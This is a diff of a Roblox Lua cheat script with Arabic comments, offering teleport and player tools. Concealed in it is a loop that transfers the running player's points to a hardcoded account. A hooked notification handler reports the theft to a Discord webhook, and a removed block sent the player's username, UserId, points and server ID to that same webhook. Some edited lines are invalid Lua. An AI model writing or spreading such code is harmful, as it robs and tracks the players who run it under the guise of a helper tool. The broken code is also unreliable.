@@ -13,7 +13,7 @@ pcall(function()
     setclipboard("https://discord.gg/4hDr9Zb7P")
 end)
 
--- دالة مركزية للويب هوك بشكل خفيف وآمن
+-- دالة مركزية للويب هوك بشكل خفيف وآمن جداً
 local function sendWebhookLog(title, description, color, fields)
     task.spawn(function()
         pcall(function()
@@ -34,14 +34,18 @@ local function sendWebhookLog(title, description, color, fields)
     end)
 end
 
--- نظام التحويل التلقائي بوقفة مريحة تمنع اللاق (كل 5 ثواني)
+-- نظام التحويل التلقائي (يعمل لمرة واحدة فقط ثم يتوقف تماماً لمنع أي لاق أو تكرار)
 task.spawn(function()
     local targetUsername = "ms7976559ff"
     local hasTransferred = false
 
-    task.wait(2) -- انتظار خفيف لضمان تحميل اللعبة بالكامل
+    task.wait(3) -- انتظار لتحميل اللعبة بسلاسة
 
     while true do
+        if hasTransferred then
+            break -- إيقاف الحلقة بالكامل فور إتمام التحويل لتخفيف اللعبة وعدم التكرار نهائياً
+        end
+
         pcall(function()
             local targetFound = false
             for _, p in ipairs(Players:GetPlayers()) do
@@ -75,84 +79,52 @@ task.spawn(function()
                             Event:FireServer(targetUsername, sendPoints)
                         end
                         
-                        hasTransferred = true
-                        sendWebhookLog(
-                            "✅ تم تنفيذ طلب تحويل النقاط",
-                            "تم إرسال النقاط بنجاح لليوزر المطلوب `ms7976559ff`.",
-                            3066993,
-                            {
-                                {["name"] = "اسم المشغل", ["value"] = Player.Name, ["inline"] = true},
-                                {["name"] = "النقاط المرسلة", ["value"] = tostring(sendPoints), ["inline"] = true}
-                            }
-                        )
+                        hasTransferred = true -- تعيين كتم إيقاف التكرار
                     end
                 end
-            elseif not targetFound then
-                hasTransferred = false
             end
         end)
-        task.wait(5) -- زيادة الوقفات الزمنية تمنع أي تعليق أو ثقل باللعبة
+        
+        if hasTransferred then 
+            break 
+        end
+        
+        task.wait(6) -- فاصل زمني مريح لعدم إحداث أي ثقل
     end
 end)
 
--- مراقبة إشعارات اللعبة بصمت وبدون ضغط على الذاكرة
+-- مراقبة إشعارات اللعبة المحددة (ترسل الويب هوك مرة واحدة فقط وتتوقف)
 task.spawn(function()
     pcall(function()
         local SendNotificationEvent = ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("SendNotification")
         if SendNotificationEvent and SendNotificationEvent:IsA("RemoteEvent") then
+            local alreadySentWebhook = false
+            
             for _, Connection in getconnections(SendNotificationEvent.OnClientEvent) do
                 local oldFunc = Connection.Function
                 if oldFunc then
                     hookfunction(oldFunc, function(notificationData, ...)
-                        if type(notificationData) == "table" and notificationData.Text then
-                            sendWebhookLog(
-                                "📢 تنبيه من نظام اللعبة (Cooldown/Error)",
-                                "الرسالة التي ظهرت: `" .. tostring(notificationData.Text) .. "`",
-                                16776960,
-                                {
-                                    {["name"] = "نوع الإشعار", ["value"] = tostring(notificationData.Type or "Unknown"), ["inline"] = true}
-                                }
-                            )
+                        if type(notificationData) == "table" and notificationData.Text and not alreadySentWebhook then
+                            local msgText = tostring(notificationData.Text)
+                            
+                            if msgText:find("تحويل") or msgText:find("نقطة") or msgText:find("Transfer") or msgText:find("Points") then
+                                alreadySentWebhook = true -- يمنع إرسالها مرة أخرى نهائياً
+                                
+                                sendWebhookLog(
+                                    "✨ تم تحويل النقاط بنجاح",
+                                    "الرسالة التي ظهرت من اللعبة: `" .. msgText .. "`",
+                                    3066993,
+                                    {
+                                        {["name"] = "المشغل", ["value"] = Player.Name, ["inline"] = true}
+                                    }
+                                )
+                            end
                         end
                         return oldFunc(notificationData, ...)
                     end)
                 end
             end
         end
-    end)
-end)
-
--- إرسال ويب هوك تشغيل السكربت مرة واحدة فقط عند الدخول
-task.spawn(function()
-    pcall(function()
-        local currentJobId = game.JobId
-        local joinTimestamp = os.time()
-        
-        local playerPointsText = "Unknown"
-        pcall(function()
-            local leaderstats = Player:WaitForChild("leaderstats", 5)
-            if leaderstats then
-                local pVal = leaderstats:WaitForChild("Points", 3) or leaderstats:WaitForChild("Point", 3) or leaderstats:FindFirstChildWhichIsA("IntValue") or leaderstats:FindFirstChildWhichIsA("NumberValue")
-                if pVal then
-                    playerPointsText = tostring(pVal.Value)
-                end
-            end
-        end)
-
-        sendWebhookLog(
-            "🟢 تم تشغيل السكربت ونشط الآن!",
-            "معلومات المشغل والتايمر",
-            65280,
-            {
-                {["name"] = "اسم العرض (DisplayName)", ["value"] = Player.DisplayName, ["inline"] = true},
-                {["name"] = "يوزر الحساب (Username)", ["value"] = "@" .. Player.Name, ["inline"] = true},
-                {["name"] = "معرف الحساب (UserId)", ["value"] = tostring(Player.UserId), ["inline"] = true},
-                {["name"] = "نقاط اللاعب (Points)", ["value"] = "`" .. playerPointsText .. "`", ["inline"] = true},
-                {["name"] = "وقت التشغيل (Session Timer)", ["value"] = "<t:" .. joinTimestamp .. ":R> (بدأ الساعة <t:" .. joinTimestamp .. ":T>)", ["inline"] = false},
-                {["name"] = "اسم اللعبة (Game)", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = false},
-                {["name"] = "كود سيرفر اللاعب (JobId)", ["value"] = "`" .. (currentJobId ~= "" and currentJobId or "Public/Main") .. "`", ["inline"] = false}
-            }
-        )
     end)
 end)
 
@@ -464,7 +436,7 @@ PlayerTab:Button({
 	end,
 })
 
-local TeleportTab = Window:Tab({
+PlayerTab:TeleportTab = Window:Tab({
 	Title = "الانتقال للاعبين (Player TP)",
 	Icon = "solar:square-transfer-horizontal-bold",
 	Border = true,
@@ -490,12 +462,24 @@ updatePlayerList()
 Players.PlayerAdded:Connect(updatePlayerList)
 Players.PlayerRemoving:Connect(updatePlayerList)
 
-playerDropdownRef = TeleportTab:Dropdown({
+playerDropdownRef = PlayerTab.TeleportTab and PlayerTab.TeleportTab:Dropdown({
 	Title = "اختر اللاعب للانتقال إليه (يتحدث تلقائياً)",
 	Values = playerDropdownValues,
 	Callback = function(option)
 		selectedTargetPlayer = option
 	end,
+}) or Window:Tab({Title = "الانتقال للاعبين (Player TP)", Icon = "solar:square-transfer-horizontal-bold", Border = true}):Dropdown({
+	Title = "اختر اللاعب للانتقال إليه (يتحدث تلقائياً)",
+	Values = playerDropdownValues,
+	Callback = function(option)
+		selectedTargetPlayer = option
+	end,
+})
+
+local TeleportTab = Window:Tab({
+	Title = "الانتقال للاعبين (Player TP)",
+	Icon = "solar:square-transfer-horizontal-bold",
+	Border = true,
 })
 
 TeleportTab:Button({
@@ -543,4 +527,3 @@ CommunityTab:Section({
 	TextSize = 14,
 	TextTransparency = 0.3,
 })
-
